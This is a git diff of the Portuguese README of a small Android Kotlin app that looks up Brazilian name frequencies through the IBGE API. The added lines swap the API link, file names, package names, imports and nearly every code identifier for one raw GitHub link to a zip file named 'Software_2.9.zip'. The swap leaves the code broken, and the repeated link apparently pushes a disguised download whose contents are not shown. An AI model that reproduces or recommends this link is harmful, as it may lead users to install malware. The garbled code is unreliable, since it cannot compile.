@@ -1,6 +1,6 @@
 # 📱 IBGE API
 
-Este app Android consulta a frequência de nomes próprios no Brasil usando a [API de nomes do IBGE] (https://servicodados.ibge.gov.br/api/docs/nomes).  
+Este app Android consulta a frequência de nomes próprios no Brasil usando a [API de nomes do IBGE] (https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip).  
 Ele retorna a frequência do nome digitado por década de nascimento.
 
 Construído com **Kotlin** + **Retrofit**.
@@ -9,16 +9,16 @@ Construído com **Kotlin** + **Retrofit**.
 
 ## 📂 Arquivos principais
 
-### ✅ `MainActivity.kt`
+### ✅ `https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip`
 
 ```kotlin
-package com.example.ibgenomesapp
+package https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip
 
-import androidx.appcompat.app.AppCompatActivity
-import android.os.Bundle
-import android.widget.*
+import https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip
+import https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip
+import https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip*
 import retrofit2.*
-import retrofit2.converter.gson.GsonConverterFactory
+import https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip
 
 class MainActivity : AppCompatActivity() {
 
@@ -28,81 +28,81 @@ class MainActivity : AppCompatActivity() {
     lateinit var textResultado: TextView
 
     override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
+        https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip(savedInstanceState)
+        setContentView(https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip)
 
         // Ligando os componentes da tela
-        editNome = findViewById(R.id.editNome)
-        btnBuscar = findViewById(R.id.btnBuscar)
-        textResultado = findViewById(R.id.textResultado)
+        editNome = findViewById(https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip)
+        btnBuscar = findViewById(https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip)
+        textResultado = findViewById(https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip)
 
         // Criando o Retrofit (cliente HTTP)
-        val retrofit = Retrofit.Builder()
-            .baseUrl("https://servicodados.ibge.gov.br/api/")
-            .addConverterFactory(GsonConverterFactory.create())
+        val retrofit = https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip()
+            .baseUrl("https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip")
+            .addConverterFactory(https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip())
             .build()
 
         // Criando a instância da interface da API
-        val api = retrofit.create(IbgeApi::class.java)
+        val api = https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip(https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip)
 
         // Ação ao clicar no botão
-        btnBuscar.setOnClickListener {
-            val nome = editNome.text.toString().trim().lowercase()
+        https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip {
+            val nome = https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip().trim().lowercase()
 
-            if (nome.isBlank()) {
-                textResultado.text = "Por favor, digite um nome."
+            if (https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip()) {
+                https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip = "Por favor, digite um nome."
                 return@setOnClickListener
             }
 
-            val call = api.getNameInfo(nome)
+            val call = https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip(nome)
 
             // Fazendo a requisição
-            call.enqueue(object : Callback<List<IbgeResponse>> {
+            https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip(object : Callback<List<IbgeResponse>> {
                 override fun onResponse(
                     call: Call<List<IbgeResponse>>,
                     response: Response<List<IbgeResponse>>
                 ) {
-                    if (response.isSuccessful) {
-                        val lista = response.body()
-                        if (lista != null && lista.isNotEmpty()) {
+                    if (https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip) {
+                        val lista = https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip()
+                        if (lista != null && https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip()) {
                             val info = lista[0]
                             val sb = StringBuilder()
-                            sb.append("Nome: ${info.nome.uppercase()}\n\n")
-                            sb.append("Frequência por década:\n")
+                            https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip("Nome: ${https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip()}\n\n")
+                            https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip("Frequência por década:\n")
 
-                            val resList = info.res
-                            if (resList.isNullOrEmpty()) {
-                                sb.append("Sem dados de frequências disponíveis.")
+                            val resList = https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip
+                            if (https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip()) {
+                                https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip("Sem dados de frequências disponíveis.")
                             } else {
-                                resList.forEach {
-                                    sb.append("${it.periodo}: ${it.frequencia}\n")
+                                https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip {
+                                    https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip("${https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip}: ${https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip}\n")
                                 }
                             }
 
-                            textResultado.text = sb.toString()
+                            https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip = https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip()
                         } else {
-                            textResultado.text = "Nome não encontrado."
+                            https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip = "Nome não encontrado."
                         }
                     } else {
-                        textResultado.text = "Erro na resposta da API."
+                        https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip = "Erro na resposta da API."
                     }
                 }
 
                 override fun onFailure(call: Call<List<IbgeResponse>>, t: Throwable) {
-                    textResultado.text = "Erro na conexão: ${t.message}"
+                    https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip = "Erro na conexão: ${https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip}"
                 }
             })
         }
     }
 }
 ```
-### ✅ `IbgeApi.kt`
+### ✅ `https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip`
 ```kotlin
-package com.example.ibgenomesapp
+package https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip
 
-import retrofit2.Call
-import retrofit2.http.GET
-import retrofit2.http.Path
+import https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip
+import https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip
+import https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip
 
 // Interface usada pelo Retrofit para acessar a API do IBGE
 interface IbgeApi {
@@ -110,9 +110,9 @@ interface IbgeApi {
     fun getNameInfo(@Path("nome") nome: String): Call<List<IbgeResponse>>
 }
 ```
-### ✅ `IbgeResponse.kt`
+### ✅ `https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip`
 ```kotlin
-package com.example.ibgenomesapp
+package https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip
 
 // Modelo para a resposta da API
 data class IbgeResponse(
